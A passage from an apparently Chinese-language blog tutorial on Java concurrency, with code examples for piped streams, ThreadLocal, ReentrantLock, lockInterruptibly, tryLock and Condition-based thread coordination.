class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">                    String data=<span class="string">&quot;&quot;</span>+i;</span><br><span class="line">                    out.write(data.getBytes());<span class="comment">//把字节数组写入到输出管道流中</span></span><br><span class="line">                &#125;</span><br><span class="line">                out.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readData</span><span class="params">(PipedInputStream in)</span></span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="comment">//从管道输入字节流中读取字节保存到字节数组中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> len=in.read(bytes);</span><br><span class="line">            <span class="keyword">while</span> (len!=-<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">//把bytes数组中从0开始读到的len个字节转换为字符串打印</span></span><br><span class="line">                System.out.println(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">                len=in.read(bytes);<span class="comment">//继续向下读</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ThreadLocal的使用"><a href="#ThreadLocal的使用" class="headerlink" title="ThreadLocal的使用"></a>ThreadLocal的使用</h3><p>除了控制资源的访问外,还可以通过增加资源来保证线程安全.</p>
<p>ThradLocal主要解决为每个线程绑定自己的值</p>
<p>给每一个线程都给一个<code>SimpleDateFormat</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> ThreadLocal&lt;SimpleDateFormat&gt; threadLocal=<span class="keyword">new</span> ThreadLocal&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SimpleDateFormat sdf=<span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy年MM月dd日 HH:mm:ss&quot;</span>);</span><br><span class="line">    <span class="comment">//定义Runnable接口实现类</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ParseDate</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ParseDate</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.i=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String text=<span class="string">&quot;2099年11月23日 08:39:&quot;</span>+i%<span class="number">60</span>;</span><br><span class="line">                <span class="comment">//设定threadLocal中的对象</span></span><br><span class="line">                <span class="keyword">if</span>(threadLocal.get()==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    threadLocal.set(<span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy年MM月dd日 HH:mm:ss&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                Date date=threadLocal.get().parse(text);</span><br><span class="line">                System.out.println(i+<span class="string">&quot;--&quot;</span>+date);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(<span class="keyword">new</span> ParseDate(i)).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以通过重写<code>ThreadLocal#initialValue()</code>方法来设置初始值,这样get()得到的就不是null了</p>
<h2 id="5-Lock显示锁"><a href="#5-Lock显示锁" class="headerlink" title="5.Lock显示锁"></a>5.Lock显示锁</h2><p>在JDK5中新增了LOCK锁接口,有ReentrantLock实现类,ReentranLock锁称为可重入锁,它的功能比synchronized多</p>
<h4 id="锁的可重入性"><a href="#锁的可重入性" class="headerlink" title="锁的可重入性"></a>锁的可重入性</h4><p>锁的可重入是指,当一个线程获得一个对象锁后,再次请求该对象锁时是可以获得该对象的锁的</p>
<p>一个简单的例子</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220818221028397.png" alt="image-20220818221028397"></p>
<h4 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h4><h5 id="ReentrantLock的基本使用"><a href="#ReentrantLock的基本使用" class="headerlink" title="ReentrantLock的基本使用"></a>ReentrantLock的基本使用</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="comment">//定义显示锁</span></span><br><span class="line">    <span class="keyword">static</span> Lock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sm1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            lock.lock();<span class="comment">//获得锁</span></span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---method 1---&quot;</span>+System.currentTimeMillis());</span><br><span class="line">            Thread.sleep(<span class="keyword">new</span> Random().nextInt(<span class="number">1000</span>));</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---method 1---&quot;</span>+System.currentTimeMillis());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();<span class="comment">//释放锁</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sm2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            lock.lock();<span class="comment">//获得锁</span></span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---method 2---&quot;</span>+System.currentTimeMillis());</span><br><span class="line">            Thread.sleep(<span class="keyword">new</span> Random().nextInt(<span class="number">1000</span>));</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---method 2---&quot;</span>+System.currentTimeMillis());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();<span class="comment">//释放锁</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Runnable r1=<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                sm1();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Runnable r2=<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                sm2();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">new</span> Thread(r1).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(r1).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(r1).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(r2).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(r2).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(r2).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220818222217922.png" alt="image-20220818222217922" style="zoom:67%;" />

<p>只要锁对象是同一个,就可以实现同步</p>
<h5 id="ReentrantLock的可重入性"><a href="#ReentrantLock的可重入性" class="headerlink" title="ReentrantLock的可重入性"></a>ReentrantLock的可重入性</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test3</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">   <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SubThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">      <span class="comment">//这里定义为static的Lock对象的原因就是为了保证每个实例对象拿到的都是同一把锁</span></span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">static</span> Lock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10000</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">               lock.lock();</span><br><span class="line">               lock.lock();</span><br><span class="line">               num++;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">               lock.unlock();</span><br><span class="line">               lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">      SubThread t1=<span class="keyword">new</span> SubThread();</span><br><span class="line">      SubThread t2=<span class="keyword">new</span> SubThread();</span><br><span class="line">      t1.start();</span><br><span class="line">      t2.start();</span><br><span class="line">      <span class="comment">//使用join让main线程等待其执行</span></span><br><span class="line">      t1.join();</span><br><span class="line">      t2.join();</span><br><span class="line">      System.out.println(SubThread.num);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220818224401783.png" alt="image-20220818224401783" style="zoom:67%;" />

<h5 id="lockInterruptibly"><a href="#lockInterruptibly" class="headerlink" title="lockInterruptibly()"></a>lockInterruptibly()</h5><p>lockInterruptibly()方法的作用:如果当前线程未被中断则获得锁,如果当前线程被中断则抛出异常</p>
<p><strong>lock.lockInterruptibly()想获取某个锁时，假若此时线程A获取到了锁，而线程B只有等待，那么对线程B调用threadB.interrupt()方法能够中断线程B的等待过程。</strong></p>
<p>==注意是:等待的那个线程B可以被中断，不是正在执行的A线程被中断==</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Lock lock=<span class="keyword">new</span> ReentrantLock();<span class="comment">//定义锁对象</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">serviceMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//lock.lock();//获得锁,即使调用了线程的interrupt()方法,该线程也没有真正的中断</span></span><br><span class="line">                lock.lockInterruptibly();</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;--- begin lock&quot;</span>);</span><br><span class="line">                <span class="comment">//执行一段耗时的操作</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Integer.MAX_VALUE;i++)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;--- end lock&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();<span class="comment">//释放锁</span></span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;*** 释放锁&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">            Server s =<span class="keyword">new</span> Server();</span><br><span class="line">            Runnable r=<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    s.serviceMethod();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            Thread t1=<span class="keyword">new</span> Thread(r);</span><br><span class="line">            t1.start();</span><br><span class="line">            Thread.sleep(<span class="number">200</span>);</span><br><span class="line">            Thread t2=<span class="keyword">new</span> Thread(r);</span><br><span class="line">            t2.start();</span><br><span class="line">            Thread.sleep(<span class="number">200</span>);</span><br><span class="line">            t2.interrupt();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220819011214242.png" alt="image-20220819011214242" style="zoom:67%;" />

<h5 id="lockInterruptibly-可以解决死锁问题"><a href="#lockInterruptibly-可以解决死锁问题" class="headerlink" title="lockInterruptibly()可以解决死锁问题"></a>lockInterruptibly()可以解决死锁问题</h5><p>对于synchronized内部锁来说,如果一个线程在等待锁,只有两个结果:要么该线程获得锁继续执行,要么就保持等待</p>
<p>==对于ReentrantedLock来说,可以在等待锁的过程中取消对锁的请求==</p>
<h5 id="trylock-方法"><a href="#trylock-方法" class="headerlink" title="trylock()方法"></a>trylock()方法</h5><h6 id="trylock-long-time-TimeUnit-unit"><a href="#trylock-long-time-TimeUnit-unit" class="headerlink" title="trylock(long time,TimeUnit unit)"></a>trylock(long time,TimeUnit unit)</h6><p>trylock(long time,TimeUnit unit)的作用在给定等待时长内锁没有被另外的线程持有,并且当前线程也没有被中断,则获得该锁,通过该方法可以实现锁对象的限时等待</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test5</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeLock</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> ReentrantLock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(lock.tryLock(<span class="number">3</span>, TimeUnit.SECONDS))&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+<span class="string">&quot;获得锁,执行耗时任务&quot;</span>);</span><br><span class="line">                    Thread.sleep(<span class="number">4000</span>);</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+<span class="string">&quot;没有获得锁&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TimeLock timeLock=<span class="keyword">new</span> TimeLock();</span><br><span class="line">        Thread t1=<span class="keyword">new</span> Thread(timeLock);</span><br><span class="line">        Thread t2=<span class="keyword">new</span> Thread(timeLock);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220819221602805.png" alt="image-20220819221602805"></p>
<p>上述的执行结果中,Thread0先获得锁执行耗时4秒的任务,Thread1尝试获得锁,但是超过3秒之后Thread1就不在等待,直接放弃获得锁</p>
<h6 id="trylock"><a href="#trylock" class="headerlink" title="trylock()"></a>trylock()</h6><p>trylock()仅在调用时锁定未被其他线程持有的锁,如果调用方法时,锁对象被其他线程持有,则放弃</p>
<h6 id="trylock-可以避免死锁"><a href="#trylock-可以避免死锁" class="headerlink" title="trylock()可以避免死锁"></a>trylock()可以避免死锁</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test6</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">IntLock</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> ReentrantLock lock1 = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> ReentrantLock lock2 = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> lockNum;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">IntLock</span><span class="params">(<span class="keyword">int</span> lockNum)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.lockNum = lockNum;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (lockNum % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (lock1.tryLock()) &#123;</span><br><span class="line">                            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;获得锁1,还想获得锁2&quot;</span>);</span><br><span class="line">                            Thread.sleep(<span class="keyword">new</span> Random().nextInt(<span class="number">100</span>));</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (lock2.tryLock()) &#123;</span><br><span class="line">                                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;同时获得锁1与锁2&quot;</span>);</span><br><span class="line">                                    <span class="keyword">return</span>;<span class="comment">//结束run方法</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (lock2.isHeldByCurrentThread()) &#123;</span><br><span class="line">                                    lock2.unlock();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (lock1.isHeldByCurrentThread()) &#123;</span><br><span class="line">                            lock1.unlock();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (lock2.tryLock()) &#123;</span><br><span class="line">                            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;获得锁2,还想获得锁1&quot;</span>);</span><br><span class="line">                            Thread.sleep(<span class="keyword">new</span> Random().nextInt(<span class="number">100</span>));</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (lock1.tryLock()) &#123;</span><br><span class="line">                                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;同时获得锁2与锁1&quot;</span>);</span><br><span class="line">                                    <span class="keyword">return</span>;<span class="comment">//结束run方法</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (lock1.isHeldByCurrentThread()) &#123;</span><br><span class="line">                                    lock1.unlock();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (lock2.isHeldByCurrentThread()) &#123;</span><br><span class="line">                            lock2.unlock();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IntLock intLock1 = <span class="keyword">new</span> IntLock(<span class="number">11</span>);</span><br><span class="line">        IntLock intLock2 = <span class="keyword">new</span> IntLock(<span class="number">10</span>);</span><br><span class="line">        Thread t1 = <span class="keyword">new</span> Thread(intLock1);</span><br><span class="line">        Thread t2 = <span class="keyword">new</span> Thread(intLock2);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        <span class="comment">//运行后,使用trylock()尝试获得锁,不会傻傻的等待,</span></span><br><span class="line">        <span class="comment">//通过循环不停的再次尝试,如果等待的时间足够长,线程总是或获得想要的资源</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220820000504397.png" alt="image-20220820000504397"></p>
<p>实际上等了蛮长时间的,但是使用trylock()确实可以避免死锁</p>
<h5 id="newCondition-方法"><a href="#newCondition-方法" class="headerlink" title="newCondition()方法"></a>newCondition()方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Condition condition=lock.newCondition();</span><br></pre></td></tr></table></figure>



<p>关键字synchronized与wait()/notify()这两个方法一起使用可以实现等待/通知模式,Lock锁的newCondition()方法返回Condition对象,Condition类也可以实现等待/通知模式</p>
<p>使用notify()通知时,JVM会随机唤醒某个等待的线程,使用Condition类可以进行选择性通知</p>
<p>await()会使当前线程等待,同时会释放锁,当其他线程调用signal()时,线程会重新获得锁并继续执行</p>
<p>signal()用于唤醒一个等待的线程</p>
<p>==不管是await()还是signal()都需要先持有锁==</p>
<p>注意:在调用Condition的await()/signal()方法前,也需要线程持有相关的Lock锁,调用await()后线程会释放这个锁,在singal()调用后会从当前Condition对象的等待队列中,唤醒一个线程,唤醒的线程会尝试获得锁,一旦获得锁成功就继续执行</p>
<h6 id="使用多个Condition对象实现通知部分线程"><a href="#使用多个Condition对象实现通知部分线程" class="headerlink" title="使用多个Condition对象实现通知部分线程"></a>使用多个Condition对象实现通知部分线程</h6><p>可以让多个condition对象管理多个等待</p>
<h6 id="使用Condition实现多线程交替打印"><a href="#使用Condition实现多线程交替打印" class="headerlink" title="使用Condition实现多线程交替打印"></a>使用Condition实现多线程交替打印</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test8</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> Lock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line">        <span class="keyword">private</span> Condition condition=lock.newCondition();</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">boolean</span> flag=<span class="keyword">true</span>;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printOne</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                lock.lock();</span><br><span class="line">                <span class="keyword">while</span> (flag)&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+<span class="string">&quot;waiting...&quot;</span>);</span><br><span class="line">                    condition.await();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;--------------&quot;</span>);</span><br><span class="line">                flag=<span class="keyword">true</span>;</span><br><span class="line">                condition.signalAll();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printTwo</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                lock.lock();</span><br><span class="line">                <span class="keyword">while</span> (!flag)&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+<span class="string">&quot;waiting...&quot;</span>);</span><br><span class="line">                    condition.await();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;===============&quot;</span>);</span><br><span class="line">                flag=<span class="keyword">false</span>;</span><br><span class="line">                condition.signalAll();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyService myService=<span class="keyword">new</span> MyService();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">                        myService.printOne();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">            <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">                        myService.printTwo();</span><br><span class="line">                    &#125;</span><br><span 